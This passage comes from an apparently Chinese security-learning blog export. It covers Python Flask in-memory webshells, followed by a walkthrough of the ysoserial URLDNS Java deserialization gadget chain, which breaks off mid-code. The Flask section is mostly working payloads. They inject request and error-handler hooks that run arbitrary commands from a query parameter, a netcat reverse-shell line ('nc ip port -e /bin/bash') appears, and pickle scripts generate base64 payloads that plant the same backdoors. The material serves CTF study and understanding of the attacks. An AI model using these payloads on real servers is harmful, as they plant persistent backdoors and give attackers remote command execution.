<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=app.teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#x27;os&#x27;).popen(&#x27;ls &gt; 10.txt&#x27;).read())</span><br></pre></td></tr></table></figure>

<p>成功执行生成了一个10.txt文件：<br><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519195626724.png" alt="image-20240519195626724"></p>
<p>并且测试了一下的确没有回显，尝试一下反弹shell，payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=app.teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#x27;os&#x27;).system(&#x27;nc ip port -e /bin/bash&#x27;))</span><br></pre></td></tr></table></figure>

<p>也成功连上。</p>
<p>测试一下<code>after_request</code>的payload(改一下基本函数即可)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=str(app.teardown_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(&#x27;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(\&#x27;ls&gt;11.txt\&#x27;).read())&#x27;)==None else resp))</span><br></pre></td></tr></table></figure>

<p>也成功执行：<br><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519195925114.png" alt="image-20240519195925114"></p>
<p>暂时就这两种payload。</p>
<h4 id="errorhandler"><a href="#errorhandler" class="headerlink" title="errorhandler"></a>errorhandler</h4><p>gxngxngxn师傅找到的，<a href="https://www.cnblogs.com/gxngxngxn/p/18181936">文章</a>，只能说牛逼</p>
<p>简单给点代码试试：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">errorhandler</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;error_handler(404)&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;404 Error&#x27;</span></span><br></pre></td></tr></table></figure>

<p>在这个代码中，使用了装饰器<code>@errorhandler(404)</code>注册了一个钩子函数<code>errorhandler()</code>函数，当发生HTTP 404 错误（页面不存在）时，调用钩子函数，跟进装饰器源码看看：<br><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519173140213.png" alt="image-20240519173140213"></p>
<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519173149931.png" alt="image-20240519173149931"></p>
<p>再跟进一下<code>register_error_handler()</code>函数</p>
<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519173241705.png" alt="image-20240519173241705"></p>
<p>总结前面两个的源码，猜测<code>f</code>就是返回值，文章说这里的code是404，exc_class是一个对象（个人还不是很懂这两个参数，等后面理解更深了再来理解）。payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec(&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;)</span><br></pre></td></tr></table></figure>

<p>在传入后再访问一个不存在的页面进行传参，这里再使用前面的源码试试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e</span>():</span><br><span class="line">    <span class="comment"># 获取传入的 cmd 参数，并执行 eval</span></span><br><span class="line">    cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> cmd:</span><br><span class="line">        result = <span class="built_in">eval</span>(cmd)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;No command provided&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>成功执行：<br><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519175544050.png" alt="image-20240519175544050"></p>
<p>那么为什么在这个自测试的源码中没有定义错误执行函数也能成功呢，</p>
<p>这是因为即使你没有显式地定义 <code>@errorhandler(404)</code> 装饰器，Flask 内部依然会有一个默认的 404 错误处理器。当你访问一个不存在的 URL（比如 <code>/123</code>），Flask 会触发这个默认的 404 错误处理器。</p>
<p>这个同样会进入到装饰器源码，所以同样可以利用。</p>
<p>虽然这个方法在那道ctf题（题目debug为false）里面复现不出来，主要还是着重于新版的<code>Flask</code>。</p>
<h4 id="个人学习总结"><a href="#个人学习总结" class="headerlink" title="个人学习总结"></a>个人学习总结</h4><ul>
<li>首先就是上面的所有方式个人本地测试时在debug模式为True或者False都能打</li>
<li>其实感觉python这几个漏洞都息息相关，python内存马的使用挺广的，个人感觉ssti、pickle反序，普通的python相关的命令执行都能用，注意融汇贯通,也许过滤可以参考ssti的过滤。</li>
<li>对于<code>str()</code>函数，只是将参数转换为字符串类型，虽然不是必要，但是最好还是加上利用。</li>
</ul>
<p><strong>简单说明一下：</strong></p>
<p>比如在每个payload中的<code>app.after_request_funcs</code>前面的<code>app</code>，</p>
<ul>
<li><p><strong>对于ssti、pickle反序和一般的命令执行的题</strong>，在flask框架里面一般都有这一串代码:</p>
<p><code>app = Flask(__name__)</code>，这一般就已经可以让这个环境有app这个应用示例。如果没有，我们可以通过类似于ssti的链子来调用出app，如下：</p>
<p><code>__import__(&#39;sys&#39;).modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].before_request_funcs</code>,后续需要的连上来就行。</p>
</li>
</ul>
<p><strong>在ssti和pickle的运用：</strong></p>
<ul>
<li><p>对于ssti就像旧版内存马样先用链子跳到<code>eval()</code>函数那里在填充进去payload即可利用</p>
</li>
<li><p>对于pickle，直接给出类似的pickle:</p>
</li>
</ul>
<p>before_request:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(\&quot;sys\&quot;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read())&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>after_request:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>errorhandler:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">exec</span>,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;</span>,)</span><br><span class="line"></span><br><span class="line">c=A()</span><br><span class="line">poc = pickle.dumps(c)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(poc))</span><br></pre></td></tr></table></figure>





<p>参考文章：<br><code>https://xz.aliyun.com/t/14421?time__1311=mqmx9QD%3D0%3Di%3DLx05DIYYIp6x02njKDuG%3DoD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F</code></p>
<p><code>https://www.cnblogs.com/gxngxngxn/p/18181936</code></p>
]]></content>
      <categories>
        <category>Python漏洞</category>
        <category>python内存马分析</category>
      </categories>
  </entry>
  <entry>
    <title>URLDNS</title>
    <url>/2024/08/13/URLDNS/</url>
    <content><![CDATA[<p>java反序列化最简单的调用链</p>
<span id="more"></span>

<h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><p><code>URLDNS</code>是ysoserial中利用链的一个名字，通常用于检测是否存在Java反序列化漏洞，该利用链有如下特点：</p>
<ul>
<li>URLDNS 利用链只能发起DNS请求，并不能进行其他利用</li>
<li>不限制jdk版本，使用Java内置类，对第三方依赖没有要求</li>
<li>目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞</li>
</ul>
<p>可以在ysoserial项目源码里看到URLDNS利用链的源码，<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">地址</a>。也可以扒到本地来再在idea上调试。</p>
<h2 id="idea配置调试ysoserial"><a href="#idea配置调试ysoserial" class="headerlink" title="idea配置调试ysoserial"></a>idea配置调试ysoserial</h2><p>先直接在<a href="https://github.com/frohoff/ysoserial">github</a>上下载源码，然后再用idea打开这个项目即可，我用的JDK8，此时pom.xml会报错，此时就点击idea右边的m，如下：</p>
<p><img src="/2024/08/13/URLDNS/image-20240707201450675.png" alt="image-20240707201450675"></p>
<p>然后将里面所有的配置文件勾选，再点击左上角两个箭头旋转的标识即可。</p>
<p><img src="/2024/08/13/URLDNS/image-20240707201659276.png" alt="image-20240707201659276"></p>
<p>随后就不会再报错。</p>
<p>此时我们再看pom.xml，来找项目的入口点（就是主类和main函数），如下：</p>
<p><img src="/2024/08/13/URLDNS/image-20240707201827863.png" alt="image-20240707201827863"></p>
<p>根据这个找到 src&#x2F;main&#x2F;java&#x2F;ysoserial&#x2F;GeneratePayload.java </p>
<p><img src="/2024/08/13/URLDNS/image-20240707201935800.png" alt="image-20240707201935800"></p>
<p>点击main函数左边的绿色箭头，点击调试，下面就只会打印usage，如下：</p>
<p><img src="/2024/08/13/URLDNS/image-20240707202055471.png" alt="image-20240707202055471"></p>
<p>这是因为没加任何参数，所以我们打开Debug Configurations：</p>
<p><img src="/2024/08/13/URLDNS/image-20240707202154167.png" alt="image-20240707202154167"></p>
<p>再在这里添加参数即可：</p>
<p><img src="/2024/08/13/URLDNS/image-20240707202232537.png" alt="image-20240707202232537"></p>
<p>我这里是添加的DNS，如下：</p>
<p><img src="/2024/08/13/URLDNS/image-20240707202639847.png" alt="image-20240707202639847"></p>
<p>然后在URLDNS的getObject()方法加一个断点，再在main函数点击调试就能正常获取值，如下：<br><img src="/2024/08/13/URLDNS/image-20240707202744687.png" alt="image-20240707202744687"></p>
<p>可以看出已经正常获取到了值。同理如果想要使用其他诸如CC1之类的链子，就改为 <code>CommomCollections1 &#39;id&#39;</code> 即可。</p>
<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>从主函数开始，在我传入参数后，来调试看一下</p>
<p><img src="/2024/08/13/URLDNS/image-20240707205551356.png" alt="image-20240707205551356"></p>
<p>可以看到此时payloadType的值为URLDNS，那么我们跟进一下getPayloadClass函数，</p>
<p><img src="/2024/08/13/URLDNS/image-20240707210404844.png" alt="image-20240707210404844"></p>
<p>可以看出这里使用反射调用了URLDNS类(反射需要注意包的问题)，即URLDNS对应的脚本的class对象并将其return。</p>
<p><img src="/2024/08/13/URLDNS/image-20240707211511284.png" alt="image-20240707211511284"></p>
<p>此时就可以看到 payloadClass 的值为 <code>class ysoserial.payloads.URLDNS</code> ，然后我们继续<strong>看后续代码，先是使用newInstance()实例化一个对象，然后再调用对象的getObject() 方法，即脚本URLDNS.java的getObject()方法</strong>，CTRL+鼠标左键继续跟进这个方法，可以发现到了一个接口类：</p>
<p><img src="/2024/08/13/URLDNS/image-20240707212318472.png" alt="image-20240707212318472"></p>
<p>然后继续调试，随后会定位到URLDNS类的getObject()方法，如下：</p>
<p><img src="/2024/08/13/URLDNS/image-20240707212641930.png" alt="image-20240707212641930"></p>
<p>这里可以看出URLDNS实现了ObjectPayload接口，在这里URLDNS类重写了 getObject() 方法并且此时的url即为我传进去的域名。</p>
<p><strong>先继续看main</strong>，在getObject()方法后，会调用serialize()方法，跟进看：</p>
<p><img src="/2024/08/13/URLDNS/image-20240707214621228.png" alt="image-20240707214621228"></p>
<p>可以看到就是在这里进行了序列化。</p>
<p><strong>现在继续分析URLDNS链，看URLDNS.java源码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A blog post with more details about this gadget chain is at the url below:</span></span><br><span class="line"><span class="comment"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   This was inspired by  Philippe Arteau <span class="doctag">@h</span>3xstream, who wrote a blog</span></span><br><span class="line"><span class="comment"> *   posting describing how he modified the Java Commons Collections gadget</span></span><br><span class="line"><span class="comment"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span></span><br><span class="line"><span class="comment"> *   the dependency on Commons Collections and does a DNS lookup with just</span></span><br><span class="line"><span class="comment"> *   standard JDK classes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class="line"><span class="comment"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class="line"><span class="comment"> *   during a comparison (either equals or hashCode).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class="line"><span class="comment"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class="line"><span class="comment"> *   it to trigger a DNS lookup.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   Gadget Chain:</span></span><br><span class="line"><span class="comment"> *     HashMap.readObject()</span></span><br><span class="line"><span class="comment"> *       HashMap.putVal()</span></span><br><span class="line"><span class="comment"> *         HashMap.hash()</span></span><br><span class="line"><span class="comment"> *           URL.hashCode()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>里面给了URLDNS的利用链：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *   Gadget Chain:</span></span><br><span class="line"><span class="comment"> *     HashMap.readObject()</span></span><br><span class="line"><span class="comment"> *       HashMap.putVal()</span></span><br><span class="line"><span class="comment"> *         HashMap.hash()</span></span><br><span class="line"><span class="comment"> *           URL.hashCode()</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>



<p>这里注意看<code>URLDNS</code>类的<code>getObject</code>方法，ysoserial会调用这个方法获得Payload。审这个方法的源码可以发现最后返回的是一个对象，而这个对象就是最后将被序列化的对象，在这里是<code>HashMap</code>。这里看一下利用的<code>getObject()</code>方法，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation---在创建有效负载时避免DNS解析</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.    </span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>这个方法的作用是<strong>生成</strong>一个<code>HashMap</code>，该<code>HashMap</code>的键是一个特定的<code>URL</code>对象。当我们在利用时，即<code>HashMap</code>被反序列化时，<code>URL</code>对象会被反序列化并触发DNS请求。<u>现在来分析一下这个getObject()方法。</u></p>
<p><strong>对于第一部分的实例化代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br></pre></td></tr></table></figure>

<p>其中的URLStreamHandler是一个抽象类，所以不能够被实例化，所以这里在URLDNS.java里创建了一个子类SilentURLStreamHandler，并重写了getHostAddress()方法和openConnection()，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么这里为什么要重写这两个方法呢？对于openConnection()方法，应该是因为父类是抽象类并且子类不是抽象的，所以子类必须将接口方法实现。</p>
<p><strong>那么为什么要重写getHostAddress()方法呢</strong>，如果将这个重写的方法注释掉，那么当我们生成payload时，就会触发DNS请求，我们来看正常的 getHostAddress() 方法</p>
<p><img src="/2024/08/13/URLDNS/image-20240707220622627.png" alt="image-20240707220622627"></p>
<p><img src="/2024/08/13/URLDNS/image-20240707223820351.png" alt="image-20240707223820351"></p>
<p>在这个getHostAddress()方法中，里面的**InetAddress.getByName(host)**方法会去发送请求，所以我们这里重写这个方法，这样在利用这个方法时，不会请求我们的hostAddress。</p>
<p><strong>还有一个重要的点就是在URL.java中</strong>，handler被transinet关键字修饰，在序列化对象的时候，handler属性不会被序列化。所以意味着重写的方法并不会带进我们的payload中，这样我们在触发反序列化漏洞时，getHostAddress并没有被重写，能够正常请求我们的网址。这也是我觉得很精妙的一个地方。</p>
<p>（具体的请求过程看了后文已很清楚了）</p>
<p><strong>现在来看第二部分，也是本篇文章最主要的部分</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ht;</span><br></pre></td></tr></table></figure>

<p>现在来看HashMap类，实现了Serializable接口，重写了readObject()方法</p>
<p>在之前说过的反序列化的知识点那里可以知道触发反序列化的方法是<code>readObject</code>，并且因为Java开发者（包括Java内置库的开发者）经常会在这⾥⾯写⾃⼰的逻辑，导致在这里可以构造利⽤链。</p>
<p>现在就看一下<code>HashMap</code>类的readObject()方法，源代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read loadFactor (ignore threshold)</span></span><br><span class="line">        <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> fields.get(<span class="string">&quot;loadFactor&quot;</span>, <span class="number">0.75f</span>);</span><br><span class="line">        <span class="keyword">if</span> (lf &lt;= <span class="number">0</span> || Float.isNaN(lf))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> + lf);</span><br><span class="line"></span><br><span class="line">        lf = Math.min(Math.max(<span class="number">0.25f</span>, lf), <span class="number">4.0f</span>);</span><br><span class="line">        HashMap.UnsafeHolder.putLoadFactor(<span class="built_in">this</span>, lf);</span><br><span class="line"></span><br><span class="line">        reinitialize();</span><br><span class="line"></span><br><span class="line">        s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">        <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> + mappings);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// use defaults</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) 